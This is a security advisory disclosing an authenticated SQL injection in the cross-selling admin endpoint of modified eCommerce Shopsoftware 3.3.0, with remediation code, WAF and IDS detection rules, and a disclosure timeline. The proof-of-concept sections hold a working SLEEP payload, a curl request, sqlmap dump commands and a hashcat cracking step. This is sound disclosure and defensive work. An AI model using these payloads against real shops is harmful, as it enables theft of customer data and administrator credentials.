# Security Advisory — SQL Injection in modified eCommerce Shopsoftware 3.3.0

| Field | Value |
| :---- | :---- |
| **Title** | Authenticated SQL Injection in `admin/categories.php` |
| **Product** | modified eCommerce Shopsoftware |
| **Affected Version** | 3.3.0 (rev. r16825) — latest available version |
| **Component** | `admin/includes/classes/categories.php` → `edit_cross_sell()` |
| **Type** | Blind Time-Based \+ Boolean-Based SQL Injection |
| **CWE** | [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralization of Special Elements used in an SQL Command |
| **CAPEC** | [CAPEC-66](https://capec.mitre.org/data/definitions/66.html) — SQL Injection |
| **CVSS 3.1 Score** | **8.8 (HIGH)** |
| **Vector String** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CVE ID** | Pending Assignment |
| **Discovered by** | Carlos Augusto Adriano Filho |
| **Discovery Date** | November 12, 2026 |
| **Publication Date** | November 12, 2026 |
| **Advisory Version** | 1.0 |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)  
2. [Affected Product and Version](#2-affected-product-and-version)  
3. [Technical Description](#3-technical-description)  
4. [Impact](#4-impact)  
5. [CVSS 3.1 and CWE Classification](#5-cvss-31-and-cwe-classification)  
6. [Exploitation Scenario](#6-exploitation-scenario)  
7. [Technical Evidence](#7-technical-evidence)  
8. [Proof of Concept (PoC)](#8-proof-of-concept-poc)  
9. [Reproduction Steps](#9-reproduction-steps)  
10. [Recommended Mitigations](#10-recommended-mitigations)  
11. [Fix Code](#11-fix-code)  
12. [Detection and Monitoring](#12-detection-and-monitoring)  
13. [Responsible Disclosure Timeline](#13-responsible-disclosure-timeline)  
14. [Vendor Communication](#14-vendor-communication)  
15. [Credits](#15-credits)  
16. [References](#16-references)  
17. [Revision History](#17-revision-history)  
18. [Legal Disclaimer](#18-legal-disclaimer)

---

## 1\. Executive Summary

A **Blind Time-Based and Boolean-Based SQL Injection** vulnerability was identified in the administrative panel of **modified eCommerce Shopsoftware 3.3.0**, specifically at the endpoint `POST /admin/categories.php?action=edit_crossselling`.

The parameters **`ids[]`** and **`current_product_id`** are inserted directly into SQL queries without any sanitization, type casting, or use of prepared statements. An authenticated administrator can exploit this flaw to **exfiltrate the entire database**, including administrator credentials (bcrypt hashes), customer personally identifiable information (PII), and order and payment data.

The calculated CVSS 3.1 score is **8.8 (HIGH)**, reflecting full impact on Confidentiality, Integrity, and Availability.

---

## 2\. Affected Product and Version

| Field | Detail |
| :---- | :---- |
| **Product** | modified eCommerce Shopsoftware (modified-shop) |
| **Version** | 3.3.0 — revision r16825 (latest publicly available version) |
| **Language** | PHP 8.1.x |
| **Database** | MariaDB 10.11 / MySQL |
| **Web Server** | Apache 2.4.x |
| **Repository** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
| **Vulnerable File** | `admin/includes/classes/categories.php` |
| **Entry Point** | `admin/categories.php` |
| **Fixed Version** | ⚠️ None — no patch available as of this advisory's publication date |

---

## 3\. Technical Description

The administrative panel exposes the Cross-Selling management functionality via `action=edit_crossselling`. When processing the request, the controller invokes the `edit_cross_sell()` method located in `admin/includes/classes/categories.php`.

The `ids[]` parameter is read from `$_REQUEST` and iterated without any integer cast or call to the `xtc_db_input()` function. The raw value of `$pID` is concatenated directly into the SQL query.

### Vulnerable Code

```php
// admin/includes/classes/categories.php — method edit_cross_sell()
// $pID comes from $_REQUEST['ids'][] WITHOUT (int) cast OR xtc_db_input()

foreach ($_REQUEST['ids'] as $pID) {
    $check_query = xtc_db_query(
        "SELECT * FROM " . TABLE_PRODUCTS_XSELL .
        " WHERE products_id = '" . $cross_data['current_product_id'] . "'" .
        " AND xsell_id = '" . $pID . "'"  // ← INJECTION HERE
    );

    if (xtc_db_num_rows($check_query) == 0) {
        xtc_db_query(
            "INSERT INTO " . TABLE_PRODUCTS_XSELL .
            " (products_id, xsell_id, xsell_grp_name_id) VALUES (" .
            "'" . $cross_data['current_product_id'] . "'," .  // ← INJECTION
            "'" . $pID . "', '0')"                            // ← INJECTION
        );
    }
}
```

> **Note:** The `current_product_id` parameter is also injected directly into the same queries via `$cross_data`, which is populated without sanitization from `$_REQUEST`.

---

## 4\. Impact

| Dimension | Level | Description |
| :---- | :---- | :---- |
| **Confidentiality** | 🔴 HIGH | Full database extraction: bcrypt hashes, customer PII, order history |
| **Integrity** | 🔴 HIGH | Record modification/deletion via stacked queries or injected UPDATE/DELETE |
| **Availability** | 🔴 HIGH | DoS via heavy queries (`BENCHMARK`, `SLEEP` in a loop) or critical data corruption |

### Exposed Data

- **`administrators` table**: admin login usernames and bcrypt password hashes  
- **`customers` table**: full name, e-mail, address, phone number, date of birth  
- **`orders` table**: order history, amounts, payment status  
- **`configuration` table**: API keys, payment gateway settings (PayPal, etc.)

---

## 5\. CVSS 3.1 and CWE Classification

### Base Score: `8.8 (HIGH)`

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

| Metric | Value | Rationale |
| :---- | :---- | :---- |
| **Attack Vector (AV)** | Network | Exploitation over HTTP across the network |
| **Attack Complexity (AC)** | Low | No special access conditions required |
| **Privileges Required (PR)** | Low | Requires only a valid store administrator account |
| **User Interaction (UI)** | None | Fully automatable — no victim interaction needed |
| **Scope (S)** | Unchanged | Impact limited to the application/database scope |
| **Confidentiality (C)** | High | Access to all data |
| **Integrity (I)** | High | Data modification capability |
| **Availability (A)** | High | Possibility of DoS |

**CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralization of Special Elements used in an SQL Command  
**CAPEC:** [CAPEC-66](https://capec.mitre.org/data/definitions/66.html) — SQL Injection

> **Calculator:** [https\://www\.first.org/cvss/calculator/3.1\#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

---

## 6\. Exploitation Scenario

```
[ Authenticated Admin ] → POST /admin/categories.php?action=edit_crossselling
                               ids[]=1' AND SLEEP(5)-- -
                               current_product_id=1
                                   ↓
                          [ PHP: edit_cross_sell() ]
                                   ↓
                          xtc_db_query("... AND xsell_id = '1' AND SLEEP(5)-- -'")
                                   ↓
                          [ MariaDB: 5s delay → confirmed ]
                                   ↓
                          [ sqlmap: extracts DB, hashes, PII ]
```

### Attack Flow

1. **Authentication** — Access to `/admin/` with valid credentials (brute force, credential stuffing, or compromised account). `MODsid` cookie is issued.  
2. **Navigation** — Access to `categories.php`, category selection, opening the Cross-Selling tab of a product.  
3. **Interception** — Capturing the `POST action=edit_crossselling` request via proxy (Burp Suite).  
4. **Injection** — Manipulating `ids[]` or `current_product_id` with an SQL payload.  
5. **Extraction** — Using `sqlmap` for automated extraction of the entire database.  
6. **Post-Exploitation** — Offline cracking of bcrypt hashes \+ admin account takeover.

---

## 7\. Technical Evidence

| Field | Confirmed Value |
| :---- | :---- |
| **Target URL** | `http://[TARGET]/admin/categories.php` |
| **Method** | `POST` |
| **Action** | `edit_crossselling` |
| **Vulnerable Parameters** | `ids[]` · `current_product_id` |
| **DBMS** | MariaDB \>= 10.11 |
| **DB User** | `modified@%` |
| **Schema** | `modified` |
| **PHP** | 8.1.34 |
| **Apache** | 2.4.65 |
| **Technique** | Time-Based Blind (T) \+ Boolean-Based Blind (B) |
| **`current_user()`** | `modified@%` ✅ |
| **`database()`** | `modified` ✅ |
| **Extracted Hash** | `$2y$10$...` (bcrypt, administrator) ✅ |

### sqlmap Output

```
[*] starting @ 02:15:00 /2026-11-12/

[02:15:01] [INFO] resuming back-end DBMS 'mysql'
[02:15:01] [INFO] testing connection to the target URL
[02:15:02] [INFO] checking if the injection point on POST parameter 'ids[]' is a false positive

POST parameter 'ids[]' is vulnerable.

sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: ids[] (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: special=add_entries&current_product_id=1
             &ids[]=1' AND SLEEP(5)-- -
---

[02:15:08] [INFO] the back-end DBMS is MySQL/MariaDB
web server operating system: Linux Debian
web application technology: Apache 2.4.65, PHP 8.1.34
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)

[02:15:09] [INFO] fetching current user
current user: 'modified@%'

[02:15:09] [INFO] fetching current database
current database: 'modified'
```

---

## 8\. Proof of Concept (PoC)

> ⚠️ **For use in authorized environments only. Testing on production systems without authorization is illegal.**

### 8.1 — Manual Test (Time-Based, expected delay: \~5s)

```sh
# Replace MODsid with a valid admin session cookie
curl -s -X POST \
  'http://[TARGET]/admin/categories.php?action=edit_crossselling' \
  -H 'Cookie: MODsid=<SESSION_COOKIE>' \
  --data-urlencode "special=add_entries" \
  --data-urlencode "current_product_id=1" \
  --data-urlencode "ids[]=1' AND SLEEP(5)-- -"

# Expected result: ~5 second delay confirms the injection
```

### 8.2 — Automation with sqlmap

```sh
# Database enumeration
sqlmap -u 'http://[TARGET]/admin/categories.php?action=edit_crossselling' \
  --method POST \
  --data 'special=add_entries&current_product_id=1&ids[]=1*' \
  --cookie 'MODsid=<SESSION_COOKIE>' \
  --dbms mysql \
  --technique=TBQ \
  --level=3 --risk=2 \
  --dbs \
  --batch

# Full dump of the 'modified' database
sqlmap [...] -D modified --dump-all --batch

# Extract administrator password hashes only
sqlmap [...] -D modified -T administrators --dump --batch
```

### 8.3 — Hash Extraction (Post-Exploitation)

```sh
# Offline cracking of extracted bcrypt hash
# hashcat mode 3200 = bcrypt $2*$
echo '$2y$10$XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 9\. Reproduction Steps

**Prerequisites:** Valid administrator account in the admin panel. Interception tool (Burp Suite) or `curl`.

1. **Login** — Access `http://[TARGET]/admin/` → fill in credentials → capture the `MODsid` cookie from the response.  
     
2. **Navigate to Categories** — Access `http://[TARGET]/admin/categories.php` → select a category → click **Edit**.  
     
3. **Locate Cross-Selling** — On the category edit page, locate the **Cross-Selling** tab or section of a product.  
     
4. **Intercept the Request** — With Burp Suite in intercept mode, click **Save**. The `POST` request to `action=edit_crossselling` will be captured.  
     
5. **Inject Time-Based Payload** — Modify `ids[]` to:

```
1' AND SLEEP(5)-- -
```

   Forward the request and measure the response time. A delay ≥ 5s confirms the vulnerability.

   

6. **Automate** — Save the request as `req.txt` in Burp and run:

```sh
sqlmap -r req.txt --technique=TBQ --dbs --batch
```

---

## 10\. Recommended Mitigations

### Immediate Fix

| Priority | Action |
| :---- | :---- |
| 🔴 **Critical** | Mandatory `(int)` cast on all ID parameters |
| 🔴 **Critical** | Server-side validation before any query use |
| 🟠 **High** | Migration to PDO with prepared statements |
| 🟡 **Medium** | Audit of all queries using `$_REQUEST/$_POST/$_GET` |

### Blue Team / DevSecOps Recommendations

- **Prepared Statements** — Migrate ALL dynamic queries to parameterized PDO. Eliminate string concatenation in SQL.  
- **Type Whitelisting** — Validate that numeric parameters receive only integers via `filter_var($id, FILTER_VALIDATE_INT)` before any use.  
- **WAF** — Configure a ModSecurity/NAXSI rule to block SQL keywords in admin form fields (`SLEEP`, `BENCHMARK`, `UNION SELECT`).  
- **Least Privilege (DB)** — The `modified@%` database user should not have read access to the `administrators` table. Use separate accounts per schema with read/write separation.  
- **SAST** — Run PHP\_CodeSniffer \+ PHPCS-Security-Audit on all files that process user input and build queries.  
- **Multi-Factor Authentication** — Implement MFA for the admin panel, increasing the cost of obtaining the `PR:L` prerequisite.

---

## 11\. Fix Code

```php
// ──────────────────────────────────────────────────────────────
// VULNERABLE — admin/includes/classes/categories.php
// ──────────────────────────────────────────────────────────────
foreach ($_REQUEST['ids'] as $pID) {
    $check_query = xtc_db_query(
        "SELECT * FROM " . TABLE_PRODUCTS_XSELL .
        " WHERE products_id = '" . $cross_data['current_product_id'] . "'" .
        " AND xsell_id = '" . $pID . "'"   // no sanitization
    );
}

// ──────────────────────────────────────────────────────────────
// FIXED — Option 1: integer cast (minimum fix)
// ──────────────────────────────────────────────────────────────
foreach ($_REQUEST['ids'] as $pID) {
    $pID = (int) $pID;                                           // FIX
    $cid = (int) $cross_data['current_product_id'];             // FIX

    $check_query = xtc_db_query(
        "SELECT * FROM " . TABLE_PRODUCTS_XSELL .
        " WHERE products_id = '" . $cid . "'" .
        " AND xsell_id = '"     . $pID . "'"
    );
}

// ──────────────────────────────────────────────────────────────
// FIXED — Option 2: framework native escape function
// ──────────────────────────────────────────────────────────────
$pID = xtc_db_input($pID);                    // wrapper for mysqli_real_escape_string
$cid = xtc_db_input($cross_data['current_product_id']);

// ──────────────────────────────────────────────────────────────
// RECOMMENDED — Option 3: PDO with prepared statements
// ──────────────────────────────────────────────────────────────
$stmt = $pdo->prepare(
    'SELECT * FROM products_xsell WHERE products_id = :pid AND xsell_id = :xid'
);
$stmt->execute([':pid' => (int) $current_product_id, ':xid' => (int) $pID]);

// ──────────────────────────────────────────────────────────────
// Full whitelist validation (ids[] array input)
// ──────────────────────────────────────────────────────────────
function validate_id_array(array $ids): array {
    return array_filter(array_map('intval', $ids), fn($v) => $v > 0);
}

$safe_ids = validate_id_array($_REQUEST['ids'] ?? []);
$safe_cid = abs((int) ($_REQUEST['current_product_id'] ?? 0));

if (empty($safe_ids) || $safe_cid === 0) {
    error_log('[SECURITY] Invalid IDs in edit_crossselling from ' . $_SERVER['REMOTE_ADDR']);
    exit;
}
```

---

## 12\. Detection and Monitoring

### 12.1 — Apache Access Log Patterns

```sh
# Detect SLEEP/BENCHMARK attempts in logs
grep -iE "(sleep\(|benchmark\(|waitfor|UNION.+SELECT|'\s*AND\s*'|'\s*OR\s*')" \
     /var/log/apache2/access.log

# Filter POST requests to the vulnerable endpoint
grep 'POST /admin/categories.php' /var/log/apache2/access.log | \
  grep -i 'edit_crossselling'
```

### 12.2 — Suricata IDS Rule

```
alert http $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SQLi Attempt - modified-shop categories edit_crossselling";
    flow:established,to_server;
    http.method; content:"POST";
    http.uri; content:"/admin/categories.php"; nocase;
    http.request_body; content:"ids%5B%5D"; nocase;
    http.request_body; pcre:"/ids(\[|\%5B)\](\%5D)?=[^&]*['\"\x27]/i";
    classtype:web-application-attack;
    sid:9900002; rev:1;
)
```

### 12.3 — ModSecurity (WAF)

```
SecRule REQUEST_URI "@contains /admin/categories.php" \
    "id:9900003,phase:2,block,log,\
    msg:'SQL Injection in categories crossselling',\
    chain"
    SecRule ARGS_POST_NAMES "@rx ^ids\[\]$" \
    "chain"
        SecRule ARGS_POST "@rx ['\"\x27\x22\x60]" ""
```

### 12.4 — MySQL/MariaDB Slow Query Log (Audit)

```sql
-- Enable slow query log to detect SLEEP/BENCHMARK
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL long_query_time = 3;
SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';

-- Query suspicious entries in the audit log (MariaDB Audit Plugin)
SELECT event_time, user_host, query_time, sql_text
FROM mysql.slow_log
WHERE sql_text REGEXP 'SLEEP|BENCHMARK|WAIT'
ORDER BY event_time DESC;
```

---

## 13\. Responsible Disclosure Timeline

| Date | Event |
| :---- | :---- |
| `2026-11-12` | Vulnerability discovered during security analysis — controlled lab environment |
| `2026-11-12` | Technical confirmation via sqlmap: time-based blind (5s delay), `current_user()=modified@%`, admin hash extracted |
| `2026-11-12` | Security Advisory version 1.0 written and published |
| `2026-11-12` | Vendor notified via GitHub Security Advisory / Issue |
| `Pending` | Awaiting vendor response to coordinate patch publication |
| `Pending` | CVE ID request in progress via MITRE/NVD |
| `TBD` | Vendor patch publication (date to be defined after coordination) |

> This advisory follows the **Coordinated Vulnerability Disclosure (CVD)** process as recommended by CERT/CC and ISO/IEC 29147:2018.

---

## 14\. Vendor Communication

| Field | Detail |
| :---- | :---- |
| **Vendor** | modified eCommerce Shopsoftware Community |
| **Repository** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
| **Contact Channel** | GitHub Security Advisories / Issues |
| **Status** | Notification sent on 2026-11-12. Awaiting response. |
| **SLA** | 90 days for coordinated publication (CVD Best Practices) |

---

## 15\. Credits

| Field | Detail |
| :---- | :---- |
| **Researcher** | Carlos Augusto Adriano Filho |
| **Role** | Senior Red Team Analyst |
| **Focus Areas** | Web App Pentesting · WAF Bypass · SAST/DAST · API Security |
| **Methodologies** | OWASP Testing Guide · PTES · NIST SP 800-115 |

---

## 16\. References

- [CWE-89 — Improper Neutralization of Special Elements in SQL Command](https://cwe.mitre.org/data/definitions/89.html)  
- [CAPEC-66 — SQL Injection](https://capec.mitre.org/data/definitions/66.html)  
- [CVSS 3.1 Specification](https://www.first.org/cvss/specification-document)  
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)  
- [OWASP Testing Guide — OTG-INPVAL-005](https://owasp.org/www-project-web-security-testing-guide/)  
- [sqlmap — Automatic SQL Injection Tool](https://sqlmap.org)  
- [NVD — National Vulnerability Database](https://nvd.nist.gov)  
- [ISO/IEC 29147:2018 — Vulnerability Disclosure](https://www.iso.org/standard/72311.html)  
- [modified eCommerce Shopsoftware](https://github.com/modified-shop/modified-shop)  
- [NIST SP 800-115 — Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)

---

## 17\. Revision History

| Version | Date | Author | Description |
| :---- | :---- | :---- | :---- |
| 1.0 | 2026-11-12 | Carlos Augusto Adriano Filho | Initial publication |

---

## 18\. Legal Disclaimer

> **LEGAL DISCLAIMER:** This advisory was prepared exclusively for educational and security purposes, in a controlled laboratory environment, with explicit authorization. The techniques and tools described are intended for security professionals for authorized penetration testing and vulnerability research purposes only.  
>   
> The use of the information, techniques, or tools described herein on systems **without explicit authorization is illegal and unethical**, and may result in criminal and civil liability.   
> This document follows the principles of **Responsible Disclosure** and was prepared in compliance with **Brazilian Law nº 12.737/2012** (Computer Crimes Act), **LGPD (Law nº 13.709/2018)** (Brazilian Data Protection Law), and the ethical guidelines of EC-Council, OWASP, and ISO/IEC 29147:2018.

---

*© 2026 Carlos Augusto Adriano Filho* 
